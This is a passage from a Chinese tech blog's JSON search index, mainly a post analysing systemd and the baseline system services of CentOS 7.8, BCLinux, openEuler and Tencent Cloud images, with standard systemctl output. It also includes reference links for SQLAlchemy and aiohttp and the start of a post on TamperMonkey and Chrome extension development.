文字真烂</a></p>\n</li>\n<li><p><a href=\"https://github.com/ahmadjavedse/sqlalchemy-paginator\">sqlalchemy-paginator Home</a></p>\n</li>\n<li><p><a href=\"https://my.oschina.net/u/4268222/blog/3515823\">使用sqlalchemy进行数据库操作示例1</a></p>\n</li>\n<li><p><a href=\"https://jingniao.github.io/2016/11/26/sqlalchemy-use-start/\">sqlalchemy的使用示例2</a></p>\n</li>\n<li><p><a href=\"https://www.jianshu.com/p/0d234e14b5d3\">SQLAlchemy ORM的简明教程</a></p>\n</li>\n<li><p><a href=\"https://hackersandslackers.com/flask-sqlalchemy-database-models/\">Flask-SQLAlchemy的高级示例（英文）</a></p>\n</li>\n<li><p><a href=\"https://www.cnblogs.com/chyingp/p/mysql-character-set-collation.html\">MySQL字符集设置大全</a></p>\n</li>\n</ul>\n<hr>\n<ul>\n<li><p><a href=\"https://docs.aiohttp.org/en/stable/web_quickstart.html#variable-resources\">asynhttp Home</a></p>\n</li>\n<li><p><a href=\"https://www.csdn.net/handbook/jinja/jinja2/templates.html#variables\">Jinja2 中文手册</a></p>\n</li>\n<li><p><a href=\"https://imququ.com/post/four-ways-to-post-data-in-http.html\">四种常见的 POST 提交数据方式</a></p>\n</li>\n</ul>\n"},{"title":"Systemd系统服务简析","url":"/2023/08/29/Systemd%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%AE%80%E6%9E%90/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Systemd 是 Linux 系统中一个重要的系统和服务管理器，最早是为了代替传统的 SysV 初始化系统（init）而开发的，相较于传统 init，systemd 具有许多优势。例如支持并行启动，可同时启动多个服务，提高系统启动速度；引入了单一进程（PID 1）和 cgroups 技术，可以更好地管理系统和服务进程。目前，许多主流 Linux 发行版都采用了 systemd 作为其默认的初始化系统，包括 Ubuntu、Debian、Fedora、CentOS、Arch Linux 等。</p>\n<p>Systemd 是一系列工具的集合，其作用也远远不仅是启动操作系统，它还接管了后台服务、结束、状态查询，以及日志归档、设备管理、电源管理、定时任务等许多职责，并支持通过特定事件（如插入特定 USB 设备）和特定端口数据触发的 On-demand（按需）任务。</p>\n<p><img src=\"/2023/08/29/Systemd%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%AE%80%E6%9E%90/arch.png\" alt=\"系统架构\"></p>\n<p>总的来说，使用 systemd 可以更加简单灵活地管理各种系统服务，它提供了统一的命令行工具和配置文件格式，使得对系统和服务的管理更加一致和简化。用户可以通过 systemctl 命令来控制 systemd 系统和管理服务。<br>注意，systemd有自己的日志系统，称为journald 。它替换了sysVinit中的syslogd。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 列出所有定义 systemd 服务</span></span><br><span class=\"line\">systemctl list-unit-files</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 列出启动失败的 systemd 服务</span></span><br><span class=\"line\">systemctl list-units --state failed</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查某个系统服务是否失败</span></span><br><span class=\"line\">systemctl is-failed [unit]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查某个服务的运行状态</span></span><br><span class=\"line\">systemctl status [unit]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查 本次 systemd 服务启动的全量日志</span></span><br><span class=\"line\">journalctl -b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检查某个服务的启动日志</span></span><br><span class=\"line\">journalctl -u [unit]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、Centos-7-8的基线版本分析\"><a href=\"#二、Centos-7-8的基线版本分析\" class=\"headerlink\" title=\"二、Centos 7.8的基线版本分析\"></a>二、Centos 7.8的基线版本分析</h2><p>以刚刚完成操作系统安装的服务器为例，可以通过 <code>systemcl status</code> 查看<strong>当前正在运行的</strong>系统服务，具体分为三个部分：</p>\n<ul>\n<li><code>init.slice</code>：systemd 的根进程，进程号是 1 ！即所有用户空间进程的祖先进程</li>\n<li><code>user.slice</code>：当前登录用户的全部会话进程，包括bash、login、sshd …</li>\n<li><code>system.slice</code>：当前所有系统服务进程，包括 service 名称及其启动的进程号</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">● MiWiFi-RA70-srv</span><br><span class=\"line\">    State: degraded</span><br><span class=\"line\">     Jobs: 0 queued</span><br><span class=\"line\">   Failed: 1 units</span><br><span class=\"line\">    Since: 六 2023-09-09 16:57:15 CST; 54s ago</span><br><span class=\"line\">   CGroup: /</span><br><span class=\"line\">           ├─1 /usr/lib/systemd/systemd --switched-root --system --deserialize 22</span><br><span class=\"line\">           ├─user.slice</span><br><span class=\"line\">           │ └─user-0.slice</span><br><span class=\"line\">           │   ├─session-2.scope</span><br><span class=\"line\">           │   │ ├─1099 sshd: root@pts/0    </span><br><span class=\"line\">           │   │ ├─1103 -bash</span><br><span class=\"line\">           │   │ └─1118 systemctl status</span><br><span class=\"line\">           │   └─session-1.scope</span><br><span class=\"line\">           │     ├─ 488 login -- root     </span><br><span class=\"line\">           │     └─1080 -bash</span><br><span class=\"line\">           └─system.slice</span><br><span class=\"line\">             ├─rsyslog.service</span><br><span class=\"line\">             │ └─817 /usr/sbin/rsyslogd -n</span><br><span class=\"line\">             ├─postfix.service</span><br><span class=\"line\">             │ ├─1056 /usr/libexec/postfix/master -w</span><br><span class=\"line\">             │ ├─1057 pickup -l -t unix -u</span><br><span class=\"line\">             │ └─1058 qmgr -l -t unix -u</span><br><span class=\"line\">             ├─tuned.service</span><br><span class=\"line\">             │ └─814 /usr/bin/python2 -Es /usr/sbin/tuned -l -P</span><br><span class=\"line\">             ├─sshd.service</span><br><span class=\"line\">             │ └─813 /usr/sbin/sshd -D</span><br><span class=\"line\">             ├─NetworkManager.service</span><br><span class=\"line\">             │ ├─498 /usr/sbin/NetworkManager --no-daemon</span><br><span class=\"line\">             │ ├─623 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-eth0.pid -lf /var/lib/NetworkManager/dhclient-3a3e2847-23bf-477e-87fc-a0e6356ef5d7-eth0.lease -cf /var/lib/NetworkManager/dhclient-eth0.conf eth0</span><br><span class=\"line\">             │ └─842 /sbin/dhclient -d -q -6 -N -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient6-eth0.pid -lf /var/lib/NetworkManager/dhclient6-3a3e2847-23bf-477e-87fc-a0e6356ef5d7-eth0.lease -cf /var/lib/NetworkManager/dhclient6-eth0.conf eth0</span><br><span class=\"line\">             ├─firewalld.service</span><br><span class=\"line\">             │ └─496 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid</span><br><span class=\"line\">             ├─crond.service</span><br><span class=\"line\">             │ └─480 /usr/sbin/crond -n</span><br><span class=\"line\">             ├─systemd-logind.service</span><br><span class=\"line\">             │ └─475 /usr/lib/systemd/systemd-logind</span><br><span class=\"line\">             ├─polkit.service</span><br><span class=\"line\">             │ └─473 /usr/lib/polkit-1/polkitd --no-debug</span><br><span class=\"line\">             ├─dbus.service</span><br><span class=\"line\">             │ └─470 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation</span><br><span class=\"line\">             ├─qemu-guest-agent.service</span><br><span class=\"line\">             │ └─469 /usr/bin/qemu-ga --method=virtio-serial --path=/dev/virtio-ports/org.qemu.guest_agent.0 --blacklist=guest-file-open,guest-file-close,guest-file-read,guest-file-write,guest-file-seek,guest-file-flush,guest-exec,guest-exec-status -F/etc/qemu-ga/fsfreeze-hook</span><br><span class=\"line\">             ├─auditd.service</span><br><span class=\"line\">             │ └─446 /sbin/auditd</span><br><span class=\"line\">             ├─systemd-udevd.service</span><br><span class=\"line\">             │ └─381 /usr/lib/systemd/systemd-udevd</span><br><span class=\"line\">             └─systemd-journald.service</span><br><span class=\"line\">               └─354 /usr/lib/systemd/systemd-journald</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>network、cloud-init等服务是一次性启动，并非常驻内存，因此<code>systemmctl status</code>不提供<br>可以通过<code>systemctl list-unit-files</code></p>\n</blockquote>\n<p>与内核密切相关，一般作为必须的基础服务：</p>\n<ul>\n<li><code>rsyslog</code>: Rocket-fast System Logging Service，用于操作系统收集各种日志信息</li>\n<li><code>tuned</code>：Dynamic System Tuning Daemon，监视系统组件运行状态，动态优化Linux内核</li>\n<li><code>polkit</code>：Authorization Manager，非特权用户会话与特权系统环境之间的协商者</li>\n<li><code>dbus</code>：D-Bus System Message Bus，用于进程与内核、进程之间的通信总线</li>\n<li><code>auditd</code>：Security Auditing Service，负责将Linux审计记录写入磁盘</li>\n<li><code>sshd</code>：OpenSSH server daemon，SSH后台服务</li>\n<li><code>systemd-udevd</code>：udev Kernel Device Manager，Linux默认的物理设备管理工具</li>\n<li><code>systemd-journald</code>：Journal Service，systemd 的标准日志工具</li>\n<li><code>systemd-logind</code>：Login Service，登录服务</li>\n<li><code>crond</code>：Command Scheduler，定时任务调度服务</li>\n</ul>\n<p>与应用相关，一般作为可选的服务：</p>\n<ul>\n<li><code>postfix</code>：Postfix Mail Transport Agent，邮件发送服务，注意是主机mail，经常被手工屏蔽</li>\n<li><code>firewalld</code>：dynamic firewall daemon，系统防火墙服务，通常被手工屏蔽</li>\n<li><code>NetworkManager</code>：Network Manager，网络管理服务</li>\n<li><code>qemu-guest-agent</code>：QEMU Guest Agent，虚拟机和宿主机的命令通道</li>\n</ul>\n<p>注意！systemd 状态显示为 degraded，而非 runnning，说明有系统进程发生异常。<br>通过 <code>systemctl --state=failed</code> 检查发现是 kdump.service ，原因是操作系统安装时没选配置。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">  UNIT          LOAD   ACTIVE SUB    DESCRIPTION</span><br><span class=\"line\">● kdump.service loaded failed failed Crash recovery kernel arming</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、BCLinux-的基线版本分析\"><a href=\"#三、BCLinux-的基线版本分析\" class=\"headerlink\" title=\"三、BCLinux 的基线版本分析\"></a>三、BCLinux 的基线版本分析</h2><p>众所周知，BCLinux oe21.10 是基于 openEuler 21.10 的套娃版本，但也做了一些调整：</p>\n<p>删除的服务有：</p>\n<ul>\n<li><code>auditd</code>：影响安全审计，不合理！</li>\n<li><code>postfix</code>：没啥用，而且可能造成日志磁盘满，合理！</li>\n<li><code>qemu-guest-agent</code>：需要用户自行安装</li>\n</ul>\n<p>增加的服务有：</p>\n<ul>\n<li><code>rngd</code>：Hardware RNG Entropy Gatherer Daemon。使用环境噪声和硬件随机数生成器来生成熵，并存储到内核的随机数熵池</li>\n<li><code>chronyd</code>：另一个版本的 NTP 时间服务器</li>\n<li><code>systemd-networkd</code>：systemd 提供的网络管理工具。已有 NetworkManager ，这个可删除</li>\n</ul>\n<p>除了之前的 kdump ，还发现了 1 个异常的服务：</p>\n<ul>\n<li><code>lm_sensors</code>: 检测CentOS系统的CPU温度，对于虚拟机没意义！</li>\n</ul>\n<h2 id=\"四、openEuler-22-03-的基线版本分析\"><a href=\"#四、openEuler-22-03-的基线版本分析\" class=\"headerlink\" title=\"四、openEuler 22.03 的基线版本分析\"></a>四、openEuler 22.03 的基线版本分析</h2><p>与 BCLinux oe21.10 对比分析，可以发现：</p>\n<ul>\n<li>直接删除了 <code>firewalld</code></li>\n<li>同样删除了 <code>postfix</code> ，但保留了 <code>auditd</code></li>\n<li>同样增加了 <code>rngd</code> 和 <code>chronyd</code> 的系统服务</li>\n<li>保留了虚拟机的组件 <code>qemu-guest-agent</code>，但又增加了 <code>acpid</code>？</li>\n<li>增加了用于 NFS 服务的组件 <code>gssproxy</code> 和 <code>rpcbind</code>，似乎并不合理？</li>\n<li>增加了 <code>restorecond</code>，用于给 SELinux 监测和重新加载正确的文件上下文</li>\n<li>增加了<code>systemd-hostnamed</code>，用于修改主机名称，似乎多余了！</li>\n<li>网络管理软件仍然是 NetworkManager</li>\n</ul>\n<h2 id=\"五、腾讯云-Centos-7-的基线版本\"><a href=\"#五、腾讯云-Centos-7-的基线版本\" class=\"headerlink\" title=\"五、腾讯云 Centos 7 的基线版本\"></a>五、腾讯云 Centos 7 的基线版本</h2><p>与标准的 Centos 安装版本相比，有以下变化：</p>\n<ul>\n<li>删除了 postdfix、firewalld，保留了 auditd</li>\n<li>网络管理直接基于 cloud-init 的静态文件配置，不采用 NetworkManager !!!</li>\n<li>启用基于 ntpd 的时间服务器</li>\n<li>启用虚拟机电源管理的 acpid ，但没有 qemu-guest-agent</li>\n</ul>\n<p>还有几个有意思的问题：</p>\n<ul>\n<li>启用了一个类似 crond 的调度任务系统 atd ，很奇怪？</li>\n<li>启用了 rhsmcertd：Red Hat Subscription Manager CERTification Daemon，红帽的订阅服务</li>\n<li>启用了 libstoragemgmt，用于 ceph 等后端存储阵列管理</li>\n<li>启用了 lvm2-lvmetad，用于 lvm2 的元数据管理，可能是安装 docker 引入的？</li>\n<li>启用了 tat_agent：TencentCloud Automation Tools，腾讯开发的自动化助手</li>\n</ul>\n<hr>\n<h2 id=\"附录一：Systemd-的进程管理\"><a href=\"#附录一：Systemd-的进程管理\" class=\"headerlink\" title=\"附录一：Systemd 的进程管理\"></a>附录一：Systemd 的进程管理</h2><p>系统中运行的所有进程，都是 systemd init 进程的子进程。在资源管控方面，systemd 提供了三种 unit 类型：</p>\n<ul>\n<li>service： 一个或一组进程，由 systemd 依据 unit 配置文件启动。service 对指定进程进行封装，这样进程可以作为一个整体被启动或终止。</li>\n<li>scope：一组外部创建的进程。由进程通过 fork() 函数启动和终止、之后被 systemd 在运行时注册的进程，scope 会将其封装。例如：用户会话、 容器和虚拟机被认为是 scope。</li>\n<li>slice： 一组按层级排列的 unit。slice 并不包含进程，但会组建一个层级，并将 scope 和 service 都放置其中。真正的进程包含在 scope 或 service 中。在这一被划分层级的树中，每一个 slice 单位的名字对应通向层级中一个位置的路径。</li>\n</ul>\n<p>默认情况下，systemd 会自动创建 slice、scope 和 service unit 的层级(slice、scope 和 service 都是 systemd 的 unit 类型，来为 cgroup 树提供统一的层级结构。</p>\n<ul>\n<li>.slice：根 slice</li>\n<li>system.slice：所有系统 service 的默认位置</li>\n<li>user.slice：所有用户会话的默认位置</li>\n<li>machine.slice：所有虚拟机和 Linux 容器的默认位置</li>\n</ul>\n<h2 id=\"附录二：Systemd-的管理目录\"><a href=\"#附录二：Systemd-的管理目录\" class=\"headerlink\" title=\"附录二：Systemd 的管理目录\"></a>附录二：Systemd 的管理目录</h2><p>Unit 文件按照 Systemd 约定，应该被放置指定的三个系统目录之一中。这三个目录是有优先级的，如下所示，越靠上的优先级越高。因此，在三个目录中有同名文件的时候，只有优先级最高的目录里的那个文件会被使用。</p>\n<ul>\n<li><code>/etc/systemd/system</code>：系统或用户自定义的配置文件</li>\n<li><code>/run/systemd/system</code>：软件运行时生成的配置文件</li>\n<li><code>/usr/lib/systemd/system</code>：系统或第三方软件安装时添加的配置文件。</li>\n</ul>\n<h2 id=\"附录三：Systemd-的配置管理\"><a href=\"#附录三：Systemd-的配置管理\" class=\"headerlink\" title=\"附录三：Systemd 的配置管理\"></a>附录三：Systemd 的配置管理</h2><p>CentOS7的服务systemctl脚本存放在:&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;,有系统（system）和用户（user）之分,需要开机不登陆就能运行的程序，存在系统服务里，即：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system目录下.<br>CentOS7的每一个服务以.service结尾，一般会分为3部分：[Unit]、[Service]和[Install]。</p>\n<p>[Unit]部分主要是对这个服务的说明，内容包括Description和After，Description 用于描述服务，After用于描述服务类别</p>\n<p>[Service]部分是服务的关键，是服务的一些具体运行参数的设置.</p>\n<ul>\n<li>Type&#x3D;forking是后台运行的形式，</li>\n<li>User&#x3D;users是设置服务运行的用户,</li>\n<li>Group&#x3D;users是设置服务运行的用户组,</li>\n<li>PIDFile为存放PID的文件路径，</li>\n<li>ExecStart为服务的具体运行命令,</li>\n<li>ExecReload为重启命令，</li>\n<li>ExecStop为停止命令，</li>\n<li>PrivateTmp&#x3D;True表示给服务分配独立的临时空间</li>\n</ul>\n<p>注意：[Service]部分的启动、重启、停止命令全部要求使用绝对路径，使用相对路径则会报错！</p>\n<p>[Install]部分是服务安装的相关设置，可设置为多用户的</p>\n<h2 id=\"附录四：systemctl-的全量信息\"><a href=\"#附录四：systemctl-的全量信息\" class=\"headerlink\" title=\"附录四：systemctl 的全量信息\"></a>附录四：systemctl 的全量信息</h2><figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# systemctl</span><br><span class=\"line\">  UNIT                                                                                        LOAD   ACTIVE SUB       DESCRIPTION</span><br><span class=\"line\">  proc-sys-fs-binfmt_misc.automount                                                           loaded active waiting   Arbitrary Executable File Formats File System Automount Point</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:01.1-ata2-host1-target1:0:0-1:0:0:0-block-sr0.device         loaded active plugged   QEMU_DVD-ROM CentOS_7_x86_64</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:05.0-virtio1-host2-target2:0:0-2:0:0:0-block-sda-sda1.device loaded active plugged   QEMU_HARDDISK 1</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:05.0-virtio1-host2-target2:0:0-2:0:0:0-block-sda.device      loaded active plugged   QEMU_HARDDISK</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:08.0-virtio2-virtio\\x2dports-vport2p1.device                 loaded active plugged   /sys/devices/pci0000:00/0000:00:08.0/virtio2/virtio-ports/vport2p1</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:12.0-virtio3-net-eth0.device                                 loaded active plugged   Virtio network device</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS0.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS0</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS1.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS1</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS2.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS2</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS3.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS3</span><br><span class=\"line\">  sys-module-configfs.device                                                                  loaded active plugged   /sys/module/configfs</span><br><span class=\"line\">  sys-subsystem-net-devices-eth0.device                                                       loaded active plugged   Virtio network device</span><br><span class=\"line\">  -.mount                                                                                     loaded active mounted   /</span><br><span class=\"line\">  dev-hugepages.mount                                                                         loaded active mounted   Huge Pages File System</span><br><span class=\"line\">  dev-mqueue.mount                                                                            loaded active mounted   POSIX Message Queue File System</span><br><span class=\"line\">  run-user-0.mount                                                                            loaded active mounted   /run/user/0</span><br><span class=\"line\">  sys-kernel-config.mount                                                                     loaded active mounted   Configuration File System</span><br><span class=\"line\">  sys-kernel-debug.mount                                                                      loaded active mounted   Debug File System</span><br><span class=\"line\">  systemd-ask-password-plymouth.path                                                          loaded active waiting   Forward Password Requests to Plymouth Directory Watch</span><br><span class=\"line\">  systemd-ask-password-wall.path                                                              loaded active waiting   Forward Password Requests to Wall Directory Watch</span><br><span class=\"line\">  session-1.scope                                                                             loaded active running   Session 1 of user root</span><br><span class=\"line\">  session-2.scope                                                                             loaded active running   Session 2 of user root</span><br><span class=\"line\">  auditd.service                                                                              loaded active running   Security Auditing Service</span><br><span class=\"line\">  crond.service                                                                               loaded active running   Command Scheduler</span><br><span class=\"line\">  dbus.service                                                                                loaded active running   D-Bus System Message Bus</span><br><span class=\"line\">  firewalld.service                                                                           loaded active running   firewalld - dynamic firewall daemon</span><br><span class=\"line\">  getty@tty1.service                                                                          loaded active running   Getty on tty1</span><br><span class=\"line\">● kdump.service                                                                               loaded failed failed    Crash recovery kernel arming</span><br><span class=\"line\">  kmod-static-nodes.service                                                                   loaded active exited    Create list of required static device nodes for the current kernel</span><br><span class=\"line\">  network.service                                                                             loaded active exited    LSB: Bring up/down networking</span><br><span class=\"line\">  NetworkManager-wait-online.service                                                          loaded active exited    Network Manager Wait Online</span><br><span class=\"line\">  NetworkManager.service                                                                      loaded active running   Network Manager</span><br><span class=\"line\">  polkit.service                                                                              loaded active running   Authorization Manager</span><br><span class=\"line\">  postfix.service                                                                             loaded active running   Postfix Mail Transport Agent</span><br><span class=\"line\">  qemu-guest-agent.service                                                                    loaded active running   QEMU Guest Agent</span><br><span class=\"line\">  rhel-dmesg.service                                                                          loaded active exited    Dump dmesg to /var/log/dmesg</span><br><span class=\"line\">  rhel-domainname.service                                                                     loaded active exited    Read and set NIS domainname from /etc/sysconfig/network</span><br><span class=\"line\">  rhel-import-state.service                                                                   loaded active exited    Import network configuration from initramfs</span><br><span class=\"line\">  rhel-readonly.service                                                                       loaded active exited    Configure read-only root support</span><br><span class=\"line\">  rsyslog.service                                                                             loaded active running   System Logging Service</span><br><span class=\"line\">  sshd.service                                                                                loaded active running   OpenSSH server daemon</span><br><span class=\"line\">  systemd-journal-flush.service                                                               loaded active exited    Flush Journal to Persistent Storage</span><br><span class=\"line\">  systemd-journald.service                                                                    loaded active running   Journal Service</span><br><span class=\"line\">  systemd-logind.service                                                                      loaded active running   Login Service</span><br><span class=\"line\">  systemd-random-seed.service                                                                 loaded active exited    Load/Save Random Seed</span><br><span class=\"line\">  systemd-remount-fs.service                                                                  loaded active exited    Remount Root and Kernel File Systems</span><br><span class=\"line\">  systemd-sysctl.service                                                                      loaded active exited    Apply Kernel Variables</span><br><span class=\"line\">  systemd-tmpfiles-setup-dev.service                                                          loaded active exited    Create Static Device Nodes in /dev</span><br><span class=\"line\">  systemd-tmpfiles-setup.service                                                              loaded active exited    Create Volatile Files and Directories</span><br><span class=\"line\">  systemd-udev-trigger.service                                                                loaded active exited    udev Coldplug all Devices</span><br><span class=\"line\">  systemd-udevd.service                                                                       loaded active running   udev Kernel Device Manager</span><br><span class=\"line\">  systemd-update-utmp.service                                                                 loaded active exited    Update UTMP about System Boot/Shutdown</span><br><span class=\"line\">  systemd-user-sessions.service                                                               loaded active exited    Permit User Sessions</span><br><span class=\"line\">  systemd-vconsole-setup.service                                                              loaded active exited    Setup Virtual Console</span><br><span class=\"line\">  tuned.service                                                                               loaded active running   Dynamic System Tuning Daemon</span><br><span class=\"line\">  -.slice                                                                                     loaded active active    Root Slice</span><br><span class=\"line\">  system-getty.slice                                                                          loaded active active    system-getty.slice</span><br><span class=\"line\">  system-selinux\\x2dpolicy\\x2dmigrate\\x2dlocal\\x2dchanges.slice                               loaded active active    system-selinux\\x2dpolicy\\x2dmigrate\\x2dlocal\\x2dchanges.slice</span><br><span class=\"line\">  system.slice                                                                                loaded active active    System Slice</span><br><span class=\"line\">  user-0.slice                                                                                loaded active active    User Slice of root</span><br><span class=\"line\">  user.slice                                                                                  loaded active active    User and Session Slice</span><br><span class=\"line\">  dbus.socket                                                                                 loaded active running   D-Bus System Message Bus Socket</span><br><span class=\"line\">  systemd-initctl.socket                                                                      loaded active listening /dev/initctl Compatibility Named Pipe</span><br><span class=\"line\">  systemd-journald.socket                                                                     loaded active running   Journal Socket</span><br><span class=\"line\">  systemd-shutdownd.socket                                                                    loaded active listening Delayed Shutdown Socket</span><br><span class=\"line\">  systemd-udevd-control.socket                                                                loaded active running   udev Control Socket</span><br><span class=\"line\">  systemd-udevd-kernel.socket                                                                 loaded active running   udev Kernel Socket</span><br><span class=\"line\">  basic.target                                                                                loaded active active    Basic System</span><br><span class=\"line\">  cryptsetup.target                                                                           loaded active active    Local Encrypted Volumes</span><br><span class=\"line\">  getty.target                                                                                loaded active active    Login Prompts</span><br><span class=\"line\">  local-fs-pre.target                                                                         loaded active active    Local File Systems (Pre)</span><br><span class=\"line\">  local-fs.target                                                                             loaded active active    Local File Systems</span><br><span class=\"line\">  multi-user.target                                                                           loaded active active    Multi-User System</span><br><span class=\"line\">  network-online.target                                                                       loaded active active    Network is Online</span><br><span class=\"line\">  network-pre.target                                                                          loaded active active    Network (Pre)</span><br><span class=\"line\">  network.target                                                                              loaded active active    Network</span><br><span class=\"line\">  paths.target                                                                                loaded active active    Paths</span><br><span class=\"line\">  remote-fs.target                                                                            loaded active active    Remote File Systems</span><br><span class=\"line\">  slices.target                                                                               loaded active active    Slices</span><br><span class=\"line\">  sockets.target                                                                              loaded active active    Sockets</span><br><span class=\"line\">  swap.target                                                                                 loaded active active    Swap</span><br><span class=\"line\">  sysinit.target                                                                              loaded active active    System Initialization</span><br><span class=\"line\">  timers.target                                                                               loaded active active    Timers</span><br><span class=\"line\">  systemd-tmpfiles-clean.timer                                                                loaded active waiting   Daily Cleanup of Temporary Directories</span><br><span class=\"line\"></span><br><span class=\"line\">LOAD   = Reflects whether the unit definition was properly loaded.</span><br><span class=\"line\">ACTIVE = The high-level unit activation state, i.e. generalization of SUB.</span><br><span class=\"line\">SUB    = The low-level unit activation state, values depend on unit type.</span><br><span class=\"line\"></span><br><span class=\"line\">84 loaded units listed. Pass --all to see loaded but inactive units, too.</span><br><span class=\"line\">To show all installed unit files use &#x27;systemctl list-unit-files&#x27;.</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.freedesktop.org/software/systemd/man/systemd.service.html\">Systemd 官方文档</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io\">Systemd 入门教程：命令篇 - 阮一峰</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1516125\">Systemd 服务管理教程</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/651550778\">一次搞定 Linux systemd 服务脚本</a></li>\n<li><a href=\"https://www.cnblogs.com/sparkdev/p/9523194.html\">Cgroups 与 Systemd</a></li>\n<li><a href=\"https://www.jinbuguo.com/\">金步国作品集 - Linux</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/74319084\">Linux Kdump</a></li>\n<li><a href=\"https://www.cnblogs.com/alantu2018/p/8526970.html\">linux的 0号进程 和 1 号进程</a></li>\n</ul>\n"},{"title":"TamperMonkey开发文档","url":"/2020/12/03/TamperMonkey%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><h3 id=\"TamperMonkey\"><a href=\"#TamperMonkey\" class=\"headerlink\" title=\"TamperMonkey\"></a>TamperMonkey</h3><p>Tampermonkey 是一款免费的浏览器扩展和最为流行的用户脚本管理器，它适用于 Chrome, Microsoft Edge, Safari, Opera Next, 和 Firefox。</p>\n<p>虽然有些受支持的浏览器拥有原生的用户脚本支持，但 Tampermonkey 将在您的用户脚本管理方面提供更多的便利。 它提供了诸如便捷脚本安装、自动更新检查、标签中的脚本运行状况速览、内置的编辑器等众多功能， 同时Tampermonkey还有可能正常运行原本并不兼容的脚本。</p>\n<h3 id=\"Chrome-Extension\"><a href=\"#Chrome-Extension\" class=\"headerlink\" title=\"Chrome Extension\"></a>Chrome Extension</h3><p>从本质上讲，TamperMonkey是一个用于管理Chrome Extension的软件。</p>\n<p>我们经常说的 Chrome “插件”，其实不是真正意义上的 Chrome Plug-in，一般是指 Chrome Extension(简称“拓展”)。</p>\n<ul>\n<li>扩展（Extension），指的是通过调用 Chrome 提供的 Chrome API 来扩展浏览器功能的一种组件，工作在浏览器层面，使用 HTML + Javascript 语言开发。</li>\n<li>插件（Plug-in），指的是通过调用 Webkit 内核 NPAPI&#x2F;PPAPI 来扩展内核功能的一种组件，工作在内核层面，理论上可以用任何一种生成本地二进制程序的语言开发，比如 C&#x2F;C++、Delphi 等。比如 Flash player 插件，就属于这种类型。一般在网页中用 <code>&lt;object&gt;</code> 或者 <code>&lt;embed&gt;</code> 标签声明的部分，就要靠插件来渲染。</li>\n</ul>\n<img src=\"/2020/12/03/TamperMonkey%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/extension-architecture.png\" class=\"\" title=\"Chrome Extension的技术架构\">\n\n<p>Chrome 拓展的 JS 主要可以分为这 5 类：injected script、content-script、popup js、background js 和 devtools js，</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">JS种类</th>\n<th align=\"center\">可访问的API</th>\n<th align=\"center\">DOM访问情况</th>\n<th align=\"center\">JS访问情况</th>\n<th align=\"center\">直接跨域</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">injected script</td>\n<td align=\"center\">和普通 JS 无任何差别，不能访问任何扩展 API</td>\n<td align=\"center\">可以访问</td>\n<td align=\"center\">可以访问</td>\n<td align=\"center\">不可以</td>\n</tr>\n<tr>\n<td align=\"center\">content script</td>\n<td align=\"center\">只能访问 extension、runtime 等部分API</td>\n<td align=\"center\">可以访问</td>\n<td align=\"center\">不可以</td>\n<td align=\"center\">不可以</td>\n</tr>\n<tr>\n<td align=\"center\">popup js</td>\n<td align=\"center\">可访问绝大部分 API，除了 devtools 系列</td>\n<td align=\"center\">不可直接访问</td>\n<td align=\"center\">不可以</td>\n<td align=\"center\">可以</td>\n</tr>\n<tr>\n<td align=\"center\">background js</td>\n<td align=\"center\">可访问绝大部分 API，除了 devtools 系列</td>\n<td align=\"center\">不可直接访问</td>\n<td align=\"center\">不可以</td>\n<td align=\"center\">可以</td>\n</tr>\n<tr>\n<td align=\"center\">devtools js</td>\n<td 